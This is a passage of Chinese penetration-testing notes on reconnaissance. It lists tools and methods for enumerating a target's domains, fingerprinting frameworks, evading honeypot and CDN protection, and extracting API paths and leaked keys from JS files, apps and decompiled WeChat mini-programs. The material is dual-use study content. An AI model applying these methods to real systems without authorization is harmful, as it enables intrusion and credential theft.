    <content type="html"><![CDATA[<h1 id="信息打点"><a href="#信息打点" class="headerlink" title="信息打点"></a>信息打点</h1><h3 id="业务资产"><a href="#业务资产" class="headerlink" title="业务资产"></a>业务资产</h3><p>‍</p><h4 id="查询平台"><a href="#查询平台" class="headerlink" title="查询平台"></a>查询平台</h4><p>国内：</p><p>企业信息： <a href="https://aiqicha.baidu.com/">爱企查</a> <a href="https://sou.xiaolanben.com/">小蓝本</a></p><p>备案信息：<a href="http://www.beianx.cn/?WebShieldDRSessionVerify=2otCHudNMHJulFOLcsQw">备案信息查询</a> <a href="https://beian.miit.gov.cn/#/Integrated/index">备案管理系统</a></p><p>公众号信息：<a href="https://weixin.sogou.com/">公众号</a></p><p>域名信息：<a href="https://buy.cloud.tencent.com/domain">注册域名</a></p><p>IP反查：<a href="https://x.threatbook.com/">微步情报社区</a></p><p>DNS数据：<a href="https://dnsdumpster.com/">dnsdumpster</a></p><p>证书查询：<a href="https://crt.sh/">CertificateSearch</a></p><p>网络空间：<a href="https://fofa.info/">FOFA</a> <a href="https://quake.360.net/quake/#/index">360</a></p><p>威胁情报：<a href="https://x.threatbook.com/">微步情报社区</a> <a href="https://ti.qianxin.com/">奇安信威胁情报中心</a> <a href="https://ti.360.cn/#/homepage">360安全大脑</a> <a href="https://ti.sangfor.com.cn/analysis-platform?lang=ZH-CN">深信服威胁情报中心</a> <a href="https://www.zoomeye.org/?R1nG">钟馗之眼</a> <a href="https://0.zone/">零零信安</a></p><p>枚举解析：<a href="http://tools.bugscaner.com/subdomain/">在线子域名查询</a> <a href="https://www.dnsgrep.cn/subdomain">DNSGrep子域名查询</a> 子域名收集器—OneForAll</p><p>指纹识别：<a href="http://finger.tidesec.com/">TideFinger 潮汐</a> 插件Wappalyzer</p><p>‍</p><p>国外：</p><p>企业信息：<a href="https://opencorporates.com/">OpenCorporates</a></p><p>网络空间：<a href="https://www.shodan.io/">shodan</a></p><p>‍</p><h3 id="web应用"><a href="#web应用" class="headerlink" title="web应用"></a>web应用</h3><h4 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ol><li>程序语言</li><li>框架源码</li><li>搭建平台</li><li>数据库类别</li><li>操作系统</li></ol><h5 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h5><p>指纹识别</p><p>‍</p><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><h5 id="单域名"><a href="#单域名" class="headerlink" title="单域名"></a>单域名</h5><ol><li>备案信息</li><li>企业产权</li><li>注册域名</li><li>反查解析</li></ol><h5 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h5><ol><li>DNS数据</li><li>证书查询</li><li>网络空间</li><li>威胁情报</li><li>枚举解析</li></ol><h5 id="平台（常用）"><a href="#平台（常用）" class="headerlink" title="平台（常用）"></a>平台（常用）</h5><h6 id="DNS数据：dnsdumpster"><a href="#DNS数据：dnsdumpster" class="headerlink" title="DNS数据：dnsdumpster"></a>DNS数据：<a href="https://dnsdumpster.com/">dnsdumpster</a></h6><h6 id="证书查询：CertificateSearch"><a href="#证书查询：CertificateSearch" class="headerlink" title="证书查询：CertificateSearch"></a>证书查询：<a href="https://crt.sh/">CertificateSearch</a></h6><h6 id="网络空间：360"><a href="#网络空间：360" class="headerlink" title="网络空间：360"></a>网络空间：<a href="https://quake.360.net/quake/#/index">360</a></h6><h6 id="威胁情报：微步情报社区"><a href="#威胁情报：微步情报社区" class="headerlink" title="威胁情报：微步情报社区"></a>威胁情报：<a href="https://x.threatbook.com/">微步情报社区</a></h6><h6 id="枚举解析：DNSGrep子域名查询-OneForAll"><a href="#枚举解析：DNSGrep子域名查询-OneForAll" class="headerlink" title="枚举解析：DNSGrep子域名查询 OneForAll"></a>枚举解析：<a href="https://www.dnsgrep.cn/subdomain">DNSGrep子域名查询</a> OneForAll</h6><p>‍</p><h4 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h4><p>‍</p><h5 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h5><ol><li>利用指纹识别找到CMS</li><li>官网下载</li></ol><p>‍</p><h5 id="闭源"><a href="#闭源" class="headerlink" title="闭源"></a>闭源</h5><p>‍</p><h6 id="常见泄露漏洞及利用"><a href="#常见泄露漏洞及利用" class="headerlink" title="常见泄露漏洞及利用"></a>常见泄露漏洞及利用</h6><ol><li>git源码泄露</li><li>svn源码泄露</li><li>ds_store源码泄露</li><li>压缩备份文件</li><li>….</li></ol><p><a href="https://www.secpulse.com/archives/124398.html">常见的Web源码泄漏漏洞及其利用 - SecPulse.COM | 安全脉搏</a></p><p>‍</p><h6 id="码云资源"><a href="#码云资源" class="headerlink" title="码云资源"></a>码云资源</h6><ol><li><p>平台</p><p> <a href="https://github.com/">https://github.com/</a></p><p> <a href="https://gitee.com/">https://gitee.com/</a></p><p> <a href="https://www.oschina.net/">https://www.oschina.net/</a></p><p> <a href="https://www.huzhan.com/">https://www.huzhan.com/</a></p></li><li><p>关键词搜索</p></li></ol><p>‍</p><h5 id="行业"><a href="#行业" class="headerlink" title="行业"></a>行业</h5><p>黑产—互站网、各类站点</p><p>‍</p><h4 id="JS前端架构"><a href="#JS前端架构" class="headerlink" title="JS前端架构"></a>JS前端架构</h4><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><h6 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h6><ol><li>前端语言：JavaScript(JS)和 JS 框架 浏览器端可以看到真实的源代码（例：vue.js）</li><li>后端语言：php java python .NET 浏览器端看不到真实的源代码（例：zblog）</li></ol><h6 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h6><ol><li>插件wappalyzer</li><li>源程序代码简短（直接看）</li><li>引入多个js文件</li><li>一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的js文件</li><li>一般cookie中有connect.sid</li></ol><h6 id="主流框架"><a href="#主流框架" class="headerlink" title="主流框架"></a>主流框架</h6><ul><li>Vue</li><li>Node JS</li><li>jQuery</li><li>Angular等</li></ul><p>‍</p><h6 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h6><ol><li>源码泄露</li><li>未授权访问&#x3D;访问JS的接口路径</li><li>敏感key泄露&#x3D;JS文件中可能配置了接口信息（云服务的API密钥，邮件服务密钥，数据库连接信息等）</li><li>API接口安全，通过代码中加密提交参数传递，隐藏或保护更多的URL路径</li></ol><p>‍</p><p>‍</p><h5 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h5><h6 id="人工"><a href="#人工" class="headerlink" title="人工"></a>人工</h6><ol><li><p>审查元素筛选JS文件</p></li><li><p>全局搜索关键字</p> <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile">src=——链接地址<br>path=    ——路径<br><span class="hljs-section">method:&quot;get&quot;    ——请求方法</span><br>http.get(<span class="hljs-string">&quot;</span><br><span class="hljs-string">method:&quot;</span>post<span class="hljs-string">&quot;</span><br><span class="hljs-string">http.post(&quot;</span><br>$.ajax<br><span class="hljs-section">http://service.httppos</span><br><span class="hljs-section">http://service.httpget</span><br></code></pre></td></tr></table></figure></li></ol><h6 id="半自动（burpsuite）"><a href="#半自动（burpsuite）" class="headerlink" title="半自动（burpsuite）"></a>半自动（burpsuite）</h6><ol><li><p>自带功能：Target-&gt;sitemap-&gt;Engagment tools-&gt;Find scripts</p><p> <img src="/assets/image-20240626175845-8tj26cd.png" alt="image">​</p></li><li><p>官方插件：JS Miner     JS Link Finder</p></li><li><p>第三方插件：HaE     Unexpected_information</p></li><li><p>插件加载器：jython-standstone</p></li></ol><h6 id="全自动（工具）"><a href="#全自动（工具）" class="headerlink" title="全自动（工具）"></a>全自动（工具）</h6><ol><li><p>表层JS中提取</p><p> JsFinder</p><p> URLFinder（推荐）</p><p> JSINFO-SCAN（和上一个类似）</p><p> FindSomething（这个是浏览器插件）</p></li><li><p>爆破获得更多JS</p><p> FFUF（需要<a href="https://wordlists.assetnote.io/">字典</a>）</p></li><li><p>JS打包器Webpack</p><p> Packer-fuzzer</p></li></ol><p>‍</p><h4 id="设备平台"><a href="#设备平台" class="headerlink" title="设备平台"></a>设备平台</h4><p>‍</p><h5 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h5><p>  Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><h6 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h6><ol><li>云WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等</li><li>硬件WAF：绿盟、安恒、深信服、知道创宇等公司商业产品</li><li>软件WAF：宝塔，安全狗、D 盾等</li><li>代码级WAF：自己写的 waf 规则，防止出现注入等，一般是在代码里面写死的</li></ol><p>‍</p><h6 id="识别-1"><a href="#识别-1" class="headerlink" title="识别"></a>识别</h6><ol><li><p>拦截页面</p></li><li><p>工具项目</p><p> <a href="https://github.com/EnableSecurity/wafw00f">wafw00f</a></p><p> <a href="https://github.com/stamparm/identYwaf">identywaf</a></p></li></ol><p>‍</p><h5 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h5><p>  蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。</p><p>‍</p><h6 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h6><p>‍</p><table><thead><tr><th>蜜罐</th><th><strong>Quake系统搜索语法</strong></th></tr></thead><tbody><tr><td>STRUTSHONEYPOT</td><td>app:“StrutsHoneypot”</td></tr><tr><td>CONPOT HTTP 蜜罐</td><td>app:“Conpot Http 蜜罐”</td></tr><tr><td>CONPOT MODBUS 蜜罐</td><td>app:“Conpot modbus 蜜罐”</td></tr><tr><td>CONPOT S7 蜜罐</td><td>app:“Conpot s7 蜜罐”</td></tr><tr><td>KIPPO 蜜罐</td><td>app:“kippo 蜜罐”</td></tr><tr><td>HONEYPY HTTP 蜜罐</td><td>app:“Honeypy Http 蜜罐”</td></tr><tr><td>HONEYPY ES蜜罐</td><td>app:“Honeypy ES蜜罐”</td></tr><tr><td>AMUN IMAP 蜜罐</td><td>app:“amun imap 蜜罐”</td></tr><tr><td>AMUN HTTP蜜罐</td><td>app:“amun http蜜罐”</td></tr><tr><td>NEPENTHES NETBIOS蜜罐</td><td>app:“Nepenthes netbios蜜罐”</td></tr><tr><td>NEPENTHES FTP 蜜罐</td><td>app:“Nepenthes FTP 蜜罐”</td></tr><tr><td>SSHESAME SSH 蜜罐</td><td>app:“sshesame ssh 蜜罐”</td></tr><tr><td>OPENCANARY蜜罐管理后台</td><td>app:“opencanary蜜罐管理后台”</td></tr><tr><td>DIONAEA SIPD 蜜罐</td><td>app:“Dionaea sipd 蜜罐”</td></tr><tr><td>DIONAEA SMBD 蜜罐</td><td>app:“Dionaea smbd 蜜罐”</td></tr><tr><td>DIONAEA HTTP 蜜罐</td><td>app:“Dionaea Http 蜜罐”</td></tr><tr><td>DIONAEA MSSQL 蜜罐</td><td>app:“Dionaea MSSQL 蜜罐”</td></tr><tr><td>DIONAEA FTP 蜜罐</td><td>app:“Dionaea ftp 蜜罐”</td></tr><tr><td>DIONAEA MEMCACHED 蜜罐</td><td>app:“Dionaea Memcached 蜜罐”</td></tr><tr><td>KOJONEY SSH 蜜罐</td><td>app:“Kojoney SSH 蜜罐”</td></tr><tr><td>WEBLOGIC蜜罐</td><td>app:“weblogic蜜罐”</td></tr><tr><td>MYSQL蜜罐</td><td>app:“MySQL蜜罐”</td></tr><tr><td>HFISH蜜罐</td><td>app:“HFish蜜罐”</td></tr><tr><td>HFISH蜜罐管理后台</td><td>app:“HFish蜜罐管理后台”</td></tr><tr><td>HONEYTHING物联网蜜罐</td><td>app:“honeything物联网蜜罐”</td></tr><tr><td>ELASTICSEARCH蜜罐</td><td>app:“elasticsearch蜜罐”</td></tr><tr><td>HOSTUS蜜罐</td><td>app:“HostUS蜜罐”</td></tr><tr><td>WHOISSCANME蜜罐</td><td>app:“whoisscanme蜜罐”</td></tr><tr><td>未知蜜罐</td><td>app:“未知蜜罐”</td></tr><tr><td>COWRIE TELNETD蜜罐</td><td>app:“Cowrie telnetd蜜罐”</td></tr><tr><td>GLASTOPF蜜罐</td><td>app:“glastopf蜜罐”</td></tr></tbody></table><p><img src="/assets/image-20240626183309-ri2ll4v.png" alt="image">​</p><h6 id="分类-2"><a href="#分类-2" class="headerlink" title="分类"></a>分类</h6><ol><li>低交互蜜罐</li><li>中交互蜜罐</li><li>高交互蜜罐</li></ol><h6 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h6><ol><li>Web蜜罐</li><li>工控蜜罐</li><li>数据库蜜罐</li><li>物联网蜜罐</li></ol><h6 id="识别-2"><a href="#识别-2" class="headerlink" title="识别"></a>识别</h6><ul><li><p>参考文章</p><p><a href="https://mp.weixin.qq.com/s/jPz9hBmUypFyQlU27vglUg">红队视角下蜜罐识别方式汇总</a></p></li><li><p>工具项目</p><p>浏览器插件：<a href="https://github.com/graynjo/Heimdallr">https://github.com/graynjo/Heimdallr</a></p><p><a href="https://github.com/360quake/quake_rs">https://github.com/360quake/quake_rs</a></p></li></ul><p>‍</p><h5 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h5><ol><li>传统访问：用户访问域名–&gt;解析服务器IP–&gt;访问目标主机</li><li>普通CDN：用户访问域名–&gt;CDN节点–&gt;真实服务器IP–&gt;访问目标主机</li><li>带WAF的CDN：用户访问域名–&gt;CDN节点（WAF）–&gt;真实服务器IP–&gt;访问目标主机</li></ol><p>‍</p><h6 id="识别-3"><a href="#识别-3" class="headerlink" title="识别"></a>识别</h6><ul><li>nslookup</li><li>多地服务器ping判断</li></ul><p>‍</p><h6 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h6><p><strong>常见方法：</strong></p><p>子域名，邮件系统，国外访问，证书查询，APP抓包，网络空间</p><p>通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</p><p>‍</p><p>超级Ping：<a href="http://www.17ce.com/">http://www.17ce.com/</a><br>超级Ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a><br>接口查询：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>接口查询：<a href="https://fofa.info/extensions/source">https://fofa.info/extensions/source</a><br>国外请求：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>国外请求：<a href="https://boce.aliyun.com/detect/">https://boce.aliyun.com/detect/</a><br>IP社区库：<a href="https://www.cz88.net/geo-public">https://www.cz88.net/geo-public</a><br>全网扫描：<a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a><br>全网扫描：<a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a><br>全网扫描：<a href="https://github.com/Pluto-123/Bypass_cdn">https://github.com/Pluto-123/Bypass_cdn</a></p><p>‍</p><p><a href="https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ">最全的CDN绕过技术文章</a></p><p>‍</p><p>‍</p><h6 id="工具平台"><a href="#工具平台" class="headerlink" title="工具平台"></a>工具平台</h6><ul><li><a href="https://www.cz88.net/geo-public">https://www.cz88.net/geo-public</a></li><li><a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></li></ul><p>‍</p><p>‍</p><h4 id="框架组件"><a href="#框架组件" class="headerlink" title="框架组件"></a>框架组件</h4><p>‍</p><h5 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h5><p>CMS指纹识别一般能识别到的都是以PHP语言开发的网页为主，其他语言开发的网页识别难度大</p><p>识别的意义就是向着对应目标使用对应的工具进行攻击</p><p>‍</p><h5 id="开发框架识别-PHP-Python-Java"><a href="#开发框架识别-PHP-Python-Java" class="headerlink" title="开发框架识别-PHP&amp;Python&amp;Java"></a>开发框架识别-PHP&amp;Python&amp;Java</h5><p><strong>Python-开发框架-Django&amp;Flask</strong></p><p>‍</p><p>Django</p><ol><li>识别插件</li><li>Set-Cookie:expires=</li></ol><p>‍</p><p>Flask</p><ol><li>识别插件</li><li>Set-Cookie:expires=</li></ol><p>‍</p><p><strong>PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii</strong></p><p>‍</p><p>ThinkPHP：</p><ol><li><p>识别插件</p></li><li><p>X-Powered-By: ThinkPHP</p></li><li><p>CMS识别到源码体系TP开发</p></li></ol><p>‍</p><p>Laravel：</p><ol><li>识别插件</li><li>Set-Cookie中特征的格式</li></ol><p>‍</p><p>Yii:</p><ol><li>识别插件</li><li>Set-Cookie中特征的格式</li></ol><p>‍</p><p><strong>Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring</strong><br>52类110个主流Java组件和框架介绍：<br><a href="https://blog.csdn.net/agonie201218/article/details/125300729">https://blog.csdn.net/agonie201218/article/details/125300729</a></p><p>Fastjson&#x2F;Jackson<br>在提交JSON数据包中修改测试：<br>-Fastjson组件会把01解析成1<br>-Jackson组件在解析01时会抛出异常<br><a href="https://forum.butian.net/share/1679">浅谈黑盒识别Fastjson&#x2F;Jackson组件</a><br><a href="https://www.iculture.cc/forum-post/24115.html">https://www.iculture.cc/forum-post/24115.html</a></p><p>Shiro<br>请求包的cookie中存在rememberMe字段。<br>返回包中存在set-Cookie：remeberMe=deleteMe。<br>请求包中存在rememberMe=x时，响应包中存在rememberMe=deleteMe。<br>有时候服务器不会主动返回remeberMe=deleteMe，直接发包即可，将Cookie内容改为remember Me=1，若相应包有rememberMe=deleteMe，则基本可以确定网站apache shiro搭建的。</p><p>Struts2<br>一般使用struts2框架后缀带do或action，可以尝试进行利用</p><p>Springboot</p><ol><li>通过web应用程序网页标签的小绿叶图标</li><li>通过springboot框架默认报错页面</li></ol><p>Solr识别</p><p>一般开放8983端口,访问页面也可以探针到</p><p>‍</p><h5 id="开发组件识别-Java常见安全漏洞组件"><a href="#开发组件识别-Java常见安全漏洞组件" class="headerlink" title="开发组件识别-Java常见安全漏洞组件"></a>开发组件识别-Java常见安全漏洞组件</h5><p><strong><a href="https://blog.csdn.net/agonie201218/article/details/125300729">52类110个主流Java组件和框架介绍</a></strong></p><p>‍</p><p>‍</p><h3 id="主机服务器"><a href="#主机服务器" class="headerlink" title="主机服务器"></a>主机服务器</h3><p>‍</p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>‍</p><h5 id="开放状态"><a href="#开放状态" class="headerlink" title="开放状态"></a>开放状态</h5><ol><li>开放：Open</li><li>关闭：Close</li><li>受到防火墙保护：Filtered</li></ol><p>‍</p><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><p><a href="https://nmap.org/download.html">Namp</a></p><p><a href="https://blog.csdn.net/qq_53079406/article/details/125263917">Namp使用教程</a></p><p><a href="https://github.com/robertdavidgraham/masscan">Masscan</a></p><p><a href="https://blog.csdn.net/qq_53079406/article/details/125266331">Masscan使用教程</a></p><p><a href="https://www.cnblogs.com/lzy575566/p/15513726.html">Masscan编译</a></p><p>‍</p><h5 id="意外环境（实际结果和扫描结果不一致）"><a href="#意外环境（实际结果和扫描结果不一致）" class="headerlink" title="意外环境（实际结果和扫描结果不一致）"></a>意外环境（实际结果和扫描结果不一致）</h5><ol><li>防火墙开放</li><li>内网服务器（内网指纹识别：<a href="https://github.com/newbe3three/gotoscan">GotoScan</a>）</li><li>Web反向代理</li></ol><p>‍</p><p>‍</p><h3 id="APP应用"><a href="#APP应用" class="headerlink" title="APP应用"></a>APP应用</h3><p>‍</p><h4 id="获取APP"><a href="#获取APP" class="headerlink" title="获取APP"></a>获取APP</h4><ol><li><p>通过查询网站去查询APP信息</p><p> <a href="https://www.xiaolanben.com/">小蓝本</a></p><p> <a href="https://aiqicha.baidu.com/">爱企查</a></p><p> <a href="https://www.qimai.cn/">七麦数据</a></p><p> <a href="https://app.diandian.com/">点点数据</a></p></li><li><p>其他方法<br> 查备案信息在搜<br> 网站上有APP下载<br> 市场直接搜单位名称</p></li><li><p>敏感信息获取<br> 通过获取App配置、数据包，去获取url、api、osskey、js等敏感信息。</p></li><li><p>资产信息：IP 域名 网站——&gt;转到对应Web测试 接口测试 服务测试</p></li><li><p>泄露信息：配置key 资源文件——&gt;key（osskey利用，邮件配置等）</p></li><li><p>代码信息java代码安全问题——&gt;逆向相关</p></li></ol><p>‍</p><h4 id="信息分类"><a href="#信息分类" class="headerlink" title="信息分类"></a>信息分类</h4><p>‍</p><p>‍</p><h5 id="资产信息"><a href="#资产信息" class="headerlink" title="资产信息"></a>资产信息</h5><h6 id="1-IP"><a href="#1-IP" class="headerlink" title="1. IP"></a>1. IP</h6><ul><li>端口服务</li></ul><h6 id="2-域名"><a href="#2-域名" class="headerlink" title="2. 域名"></a>2. 域名</h6><ul><li>WEB安全</li></ul><h6 id="3-接口"><a href="#3-接口" class="headerlink" title="3. 接口"></a>3. 接口</h6><ul><li>API接口安全</li></ul><p>‍</p><h5 id="泄露信息"><a href="#泄露信息" class="headerlink" title="泄露信息"></a>泄露信息</h5><ul><li><p>邮箱配置</p></li><li><p>接口配置</p></li><li><p>OSS配置</p></li></ul><p>‍</p><h5 id="代码信息"><a href="#代码信息" class="headerlink" title="代码信息"></a>代码信息</h5><ul><li>java代码安全问题——&gt;逆向相关</li></ul><p>‍</p><h4 id="提取技术"><a href="#提取技术" class="headerlink" title="提取技术"></a>提取技术</h4><p>‍</p><ul><li><h5 id="逆向静态提取"><a href="#逆向静态提取" class="headerlink" title="逆向静态提取"></a>逆向静态提取</h5><ul><li>反编译从源码中提取数据————&gt;优点：数据较为完整————&gt;缺点：有很多无用的资产</li></ul></li><li><h5 id="动态抓包提取"><a href="#动态抓包提取" class="headerlink" title="动态抓包提取"></a>动态抓包提取</h5><ul><li>抓包抓表现出来的数据————&gt;优点：没有误报————&gt;缺点：无法做到完整</li></ul></li><li><h5 id="动态调试提取"><a href="#动态调试提取" class="headerlink" title="动态调试提取"></a>动态调试提取</h5><ul><li>动态调试从表现中提取数据————&gt;优点：没有误报，解决不能抓包不能代理等情况，搞逆向的人能看到实时的app调用链等————&gt;缺点：无法做到完整</li></ul></li></ul><p>‍</p><p>‍</p><h4 id="项目平台"><a href="#项目平台" class="headerlink" title="项目平台"></a>项目平台</h4><ol><li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">Mobsf</a>——&gt;也可使用f8x武器库一键搭建</li><li><a href="https://github.com/kelvinBen/AppInfoScanner">AppinfoScanner</a></li></ol><p>两个在线平台</p><p><a href="https://mogua.co/">https://mogua.co/</a></p><p><a href="https://www.zhihuaspace.cn:8888/">https://www.zhihuaspace.cn:8888/</a></p><p>‍</p><p>‍</p><h3 id="小程序应用"><a href="#小程序应用" class="headerlink" title="小程序应用"></a>小程序应用</h3><p>‍</p><h4 id="小程序结构"><a href="#小程序结构" class="headerlink" title="小程序结构"></a>小程序结构</h4><p><strong>主体结构</strong></p><p>  小程序包含一个描述整体程序的app和多个描述各自页面的page  一个小程序主体部分(即APP)由三个文件组成，必须放在项目的根目录，如下：</p><p><strong>小程序主体部分 (即APP)</strong></p><table><thead><tr><th>文件</th><th>必需</th><th>作用</th></tr></thead><tbody><tr><td>app.js</td><td>是</td><td>小程序逻辑</td></tr><tr><td>app.json</td><td>是</td><td>小程序公共配置</td></tr><tr><td>app.wxss</td><td>否</td><td>小程序公共样式表</td></tr></tbody></table><p><strong>小程序页面部分</strong></p><table><thead><tr><th>文件</th><th>作用</th></tr></thead><tbody><tr><td>xxx.js</td><td>页面逻辑</td></tr><tr><td>xxx.json</td><td>页面配置</td></tr><tr><td>xxx.wxml</td><td>页面结构</td></tr><tr><td>xxx.wxss</td><td>页面样式</td></tr></tbody></table><p><strong>项目整体目录结构</strong></p><table><thead><tr><th>文件&#x2F;文件夹</th><th>作用</th></tr></thead><tbody><tr><td>pages</td><td>页面文件夹</td></tr><tr><td>index</td><td>首页</td></tr><tr><td>logs</td><td>日志</td></tr><tr><td>utils</td><td>工具类(mina框架自动生成, 你也可以建立一个：api)</td></tr><tr><td>app.js</td><td>入口js（类似于Java类中的main方法）、全局js</td></tr><tr><td>app.json</td><td>全局配置文件</td></tr><tr><td>app.wxss</td><td>全局样式文件</td></tr><tr><td>project.config.json</td><td>跟你在详情中勾选的配置一样</td></tr><tr><td>sitemap.json</td><td>用来配置小程序及其页面是否允许被微信索引</td></tr></tbody></table><p>‍</p><h4 id="搭建小程序"><a href="#搭建小程序" class="headerlink" title="搭建小程序"></a>搭建小程序</h4><p>测试：<a href="https://qz.fkw.com/">https://qz.fkw.com/</a></p><p>参考：<a href="https://blog.csdn.net/qq_52445443/article/details/122351865">https://blog.csdn.net/qq_52445443/article/details/122351865</a></p><p>‍</p><p>‍</p><h4 id="获取小程序"><a href="#获取小程序" class="headerlink" title="获取小程序"></a>获取小程序</h4><p>直接搜关键词</p><ol><li>微信</li><li>百度</li><li>支付宝</li><li>抖音头条</li></ol><p>‍</p><h4 id="提取技术-1"><a href="#提取技术-1" class="headerlink" title="提取技术"></a>提取技术</h4><p>‍</p><ul><li><p><strong>路径</strong></p><p>微信—设置—文件管理—路径&#x2F;applet</p></li><li><p>逆向静态提取</p><p>解包</p><p>反编译</p><ul><li><a href="http://xcx.siqingw.top/(PC%E7%AB%AF%E6%93%8D%E4%BD%9C%E7%AE%80%E5%8D%95,%E9%9C%80%E8%A6%81%E4%BB%98%E8%B4%B9,%E4%BD%86%E6%98%AF%E5%BE%88%E4%BE%BF%E5%AE%9C)">http://xcx.siqingw.top/(PC端操作简单,需要付费,但是很便宜)</a></li><li><a href="https://www.cnblogs.com/oodcloud/p/16964878.html(%E9%9C%80%E8%A6%81%E5%B7%B2root%E7%9A%84%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%93%8D%E4%BD%9C%EF%BC%8C%E8%BE%83%E5%A4%8D%E6%9D%82)">https://www.cnblogs.com/oodcloud/p/16964878.html(需要已root的安卓手机操作，较复杂)</a></li></ul></li><li><p>动态抓包提取</p><p>Proxifier</p><p>Burpsuite</p></li><li><p>动态调试提取</p><p>小程序助手—–&gt;<a href="http://xcx.siqingw.top/">http://xcx.siqingw.top/</a></p><p>微信官方开发工具—–&gt;<a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html">https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html</a></p></li></ul><p>‍</p><p>详细步骤</p><ol><li><p>第一个小程序（需要购买）</p><ol><li><p>打开小程序助手，点击解包文件</p></li><li><p>打开小程序安装目录，在微信文件存储位置文件下的Applet，为了更好判断，删除多余无用的小程序缓存</p></li><li><p>选择一个小程序运行，运行完后会在Applet目录下产生一个新的文件夹</p></li><li><p>回到小程序助手打开小程序所在的目录，如果有多个wxapkg文件就多选进行打开，保证APP的那个在第一个</p></li><li><p>显示解包成功之后点击刷新反编译包，选中刚刚选择的解包的文件</p></li><li><p>然后根据小程序界面的美观程度选择新旧版反编译</p></li><li><p>点击反编译之后会生成一个文件夹，反编译的源码就在这个文件夹下</p></li><li><p>打开微信开发者工具，打开刚刚反编译后的源码</p></li><li><p>点击右上角的详情，点击本地设置，取消勾选将JS编译成ES5</p></li><li><p>点击可视化，对预览界面进行点击查看调试器的信息</p></li><li><p>选择pages文件夹后点击list目录下的list.wxml查看预览页面变化，然后逐一点开各个文件夹下的.wxml进行查看</p></li><li><p>再打开Burp进行抓包，根据显示的URL进入微信开发者工具index文件夹下的JS文件进行搜索查找</p></li><li><p>再进行查找，在wxml文件中可能泄露图标所在的URL</p></li></ol></li><li><p>第二个小程序</p><ol><li><p>寻找其他小程序进行测试</p></li><li><p>遍历目录查看预览界面样式，寻找有没有存在未授权访问</p></li><li><p>搜索源码中的敏感字段，例如accesskey，看是否存在OSS资源信息</p></li><li><p>打开小程序助手，点击抓取素材工具，运行图片抓取，可以搜集一些域名信息</p></li></ol></li></ol><p>‍</p><p>‍</p><h3 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h3><p>‍</p><h4 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h4><ol><li>沏茶信息知识产权</li><li>搜狗—&gt;<a href="https://wx.sogou.com/">https://wx.sogou.com/</a></li><li>微信直接搜</li></ol><p>‍</p><h4 id="资产"><a href="#资产" class="headerlink" title="资产"></a>资产</h4><p>直接查看微信公众号是否有第三方网站或服务</p><p>‍</p><p>‍</p><h3 id="工具项目"><a href="#工具项目" class="headerlink" title="工具项目"></a>工具项目</h3><p>‍</p><p>总结：<a href="https://github.com/guchangan1/All-Defense-Tool">https://github.com/guchangan1/All-Defense-Tool</a></p><p>‍</p><ul><li><p>武器库部署：</p><p><a href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a></p><ol><li>介绍：一款红&#x2F;蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等.</li><li>下载：wget -O f8x <a href="https://f8x.io/">https://f8x.io/</a></li><li>使用：见项目文档</li></ol></li></ul><p>‍</p><ul><li><p>网络空间：</p><p><a 